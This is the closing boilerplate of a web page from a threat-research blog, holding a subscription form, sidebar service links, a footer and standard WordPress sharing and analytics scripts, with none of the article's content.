<input type="hidden" id="_wpnonce" name="_wpnonce" value="2bedf18890" /><input type="hidden" name="_wp_http_referer" value="/2023/06/12/a-truly-graceful-wipe-out/" /><input type="hidden" name="post_id" value="18950" /> <button type="submit" class="wp-block-button__link no-border-radius" style="font-size: 16px;padding: 15px 23px 15px 23px;margin: 0; margin-left: 10px;border-radius: 0px;border-width: 1px;" name="jetpack_subscriptions_widget">
Subscribe </button>
</p>
</div>
</form>
</div>
</div>
</section><section id="block-21" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://the-dfir-report-store.myshopify.com/products/dfir-labs-ctf-july-6-16-00-20-00-utc"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1.png" alt class="wp-image-35571 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1.png 200w, https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h4 class="wp-block-heading"><a href="https://the-dfir-report-store.myshopify.com/products/dfir-labs-ctf-july-6-16-00-20-00-utc">Register For Our Next CTF</a></h4>
</div></div>
</section><section id="block-8" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s.png" alt class="wp-image-21332 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/" data-type="link" data-id="https://thedfirreport.com/">Reports</a></h3>
</div></div>
</section><section id="block-9" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/threat-intelligence/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s.png" alt class="wp-image-21334 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></h3>
</div></div>
</section><section id="block-10" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/detection-rules/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s.png" alt class="wp-image-21336 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></h3>
</div></div>
</section><section id="block-16" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/dfir-labs/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2024/04/labs-s.png" alt class="wp-image-31051 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/labs-s.png 200w, https://thedfirreport.com/wp-content/uploads/2024/04/labs-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a></h3>
</div></div>
</section><section id="block-12" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/mentoring-coaching-program/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/help4-s.png" alt class="wp-image-21333 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/help4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/help4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring and Coaching</a></h3>
</div></div>
</section></aside>
</div>
</div>
</div>
<footer id="colophon" class="site-footer" role="contentinfo">
<div class="copyright-area">
<div class="wrap">
<div class="site-info">
<a href="https://wordpress.org/">
Proudly powered by WordPress</a>
<span class="sep"> | </span>
Copyright 2023 | The DFIR Report | All Rights Reserved </div>
<div class="footer-right-info">
</div>
</div>
</div>
</footer>
<button href="#" class="back-to-top" type="button"><i class="fa-solid fa-arrow-up-long"></i>Go Top</button>
</div>
<script type="cb6555b1c83ed510cf1c9cd7-text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/thedfirreport.com\/2023\/06\/12\/a-truly-graceful-wipe-out\/":18950};
	</script>
<style id="jetpack-block-subscriptions-inline-css" type="text/css">
.is-style-compact .is-not-subscriber .wp-block-button__link,.is-style-compact .is-not-subscriber .wp-block-jetpack-subscriptions__button{border-end-start-radius:0!important;border-start-start-radius:0!important;margin-inline-start:0!important}.is-style-compact .is-not-subscriber .components-text-control__input,.is-style-compact .is-not-subscriber p#subscribe-email input[type=email]{border-end-end-radius:0!important;border-start-end-radius:0!important}.is-style-compact:not(.wp-block-jetpack-subscriptions__use-newline) .components-text-control__input{border-inline-end-width:0!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form-container{display:flex;flex-direction:column}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) .is-not-subscriber .wp-block-jetpack-subscriptions__form-elements{align-items:flex-start;display:flex}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) p#subscribe-submit{display:flex;justify-content:center}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]{box-sizing:border-box;cursor:pointer;line-height:1.3;min-width:auto!important;white-space:nowrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button[contenteditable=true],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button[contenteditable=true]{white-space:pre-wrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]:disabled,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]:disabled{color:currentColor;opacity:.5}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button{border-color:#0000;border-style:solid}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email{background:#0000;flex-grow:1}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email input[type=email]{height:auto;margin:0;width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-submit,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-submit{line-height:0;margin:0;padding:0}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__show-subs .wp-block-jetpack-subscriptions__subscount{font-size:16px;margin:8px 0;text-align:end}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__form-elements{display:block}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline button{display:inline-block;max-width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__subscount{text-align:start}#subscribe-submit.is-link{text-align:center;width:auto!important}#subscribe-submit.is-link a{margin-left:0!important;margin-top:0!important;width:auto!important}@keyframes jetpack-memberships_button__spinner-animation{to{transform:rotate(1turn)}}.jetpack-memberships-spinner{display:none;height:1em;margin:0 0 0 5px;width:1em}.jetpack-memberships-spinner svg{height:100%;margin-bottom:-2px;width:100%}.jetpack-memberships-spinner-rotating{animation:jetpack-memberships_button__spinner-animation .75s linear infinite;transform-origin:center}.is-loading .jetpack-memberships-spinner{display:inline-block}body.jetpack-memberships-modal-open{overflow:hidden}dialog.jetpack-memberships-modal{opacity:1}dialog.jetpack-memberships-modal,dialog.jetpack-memberships-modal iframe{background:#0000;border:0;bottom:0;box-shadow:none;height:100%;left:0;margin:0;padding:0;position:fixed;right:0;top:0;width:100%}dialog.jetpack-memberships-modal::backdrop{background-color:#000;opacity:.7;transition:opacity .2s ease-out}dialog.jetpack-memberships-modal.is-loading,dialog.jetpack-memberships-modal.is-loading::backdrop{opacity:0}
</style>
<script type="cb6555b1c83ed510cf1c9cd7-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/navigation.min.js?ver=6.6.2" id="freenews-navigation-js"></script>
<script type="cb6555b1c83ed510cf1c9cd7-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/skip-link-focus-fix.js?ver=6.6.2" id="freenews-skip-link-focus-fix-js"></script>
<script type="cb6555b1c83ed510cf1c9cd7-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/ResizeSensor.min.js?ver=6.6.2" id="ResizeSensor-js"></script>
<script type="cb6555b1c83ed510cf1c9cd7-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/theia-sticky-sidebar.min.js?ver=6.6.2" id="theia-sticky-sidebar-js"></script>
<script type="cb6555b1c83ed510cf1c9cd7-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick.min.js?ver=6.6.2" id="slick-js"></script>
<script type="cb6555b1c83ed510cf1c9cd7-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick-settings.js?ver=6.6.2" id="freenews-slick-settings-js"></script>
<script type="cb6555b1c83ed510cf1c9cd7-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/jquery.sticky.js?ver=6.6.2" id="jquery-sticky-js"></script>
<script type="cb6555b1c83ed510cf1c9cd7-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/sticky-setting.js?ver=6.6.2" id="freenews-sticky-settings-js"></script>
<script type="cb6555b1c83ed510cf1c9cd7-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/jquery.marquee.min.js?ver=6.6.2" id="marquee-js"></script>
<script type="cb6555b1c83ed510cf1c9cd7-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/marquee-settings.js?ver=6.6.2" id="freenews-marquee-settings-js"></script>
<script type="cb6555b1c83ed510cf1c9cd7-text/javascript" src="https://stats.wp.com/e-202443.js" id="jetpack-stats-js" data-wp-strategy="defer"></script>
<script type="cb6555b1c83ed510cf1c9cd7-text/javascript" id="jetpack-stats-js-after">
/* <![CDATA[ */
_stq = window._stq || [];
_stq.push([ "view", JSON.parse("{\"v\":\"ext\",\"blog\":\"175340963\",\"post\":\"18950\",\"tz\":\"0\",\"srv\":\"thedfirreport.com\",\"j\":\"1:13.9.1\"}") ]);
_stq.push([ "clickTrackerInit", "175340963", "18950" ]);
/* ]]> */
</script>
<script type="cb6555b1c83ed510cf1c9cd7-text/javascript" id="google-translate-init-js-extra">
/* <![CDATA[ */
var _wp_google_translate_widget = {"lang":"en_US","layout":"0"};
/* ]]> */
</script>
<script type="cb6555b1c83ed510cf1c9cd7-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/widgets/google-translate/google-translate.min.js" id="google-translate-init-js"></script>
<script type="cb6555b1c83ed510cf1c9cd7-text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit&amp;ver=13.9.1" id="google-translate-js"></script>
<script type="cb6555b1c83ed510cf1c9cd7-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/dist/vendor/wp-polyfill.min.js" id="wp-polyfill-js"></script>
<script type="cb6555b1c83ed510cf1c9cd7-text/javascript" id="jetpack-blocks-assets-base-url-js-before">
/* <![CDATA[ */
var Jetpack_Block_Assets_Base_Url="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/blocks/";
/* ]]> */
</script>
<script type="cb6555b1c83ed510cf1c9cd7-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/dist/dom-ready.min.js" id="wp-dom-ready-js"></script>
<script type="cb6555b1c83ed510cf1c9cd7-text/javascript" src="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/blocks/subscriptions/view.js?minify=false&amp;ver=13.9.1" id="jetpack-block-subscriptions-js"></script>
<script type="cb6555b1c83ed510cf1c9cd7-text/javascript" id="sharing-js-js-extra">
/* <![CDATA[ */
var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
/* ]]> */
</script>
<script type="cb6555b1c83ed510cf1c9cd7-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/sharedaddy/sharing.min.js" id="sharing-js-js"></script>
<script type="cb6555b1c83ed510cf1c9cd7-text/javascript" id="sharing-js-js-after">
/* <![CDATA[ */
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-twitter' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-twitter' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-linkedin' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-linkedin' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomlinkedin', 'menubar=1,resizable=1,width=580,height=450' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-facebook' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-facebook' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
						return false;
					}
				} );
			} )();
/* ]]> */
</script>
<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="cb6555b1c83ed510cf1c9cd7-|49" defer></script></body>
</html>
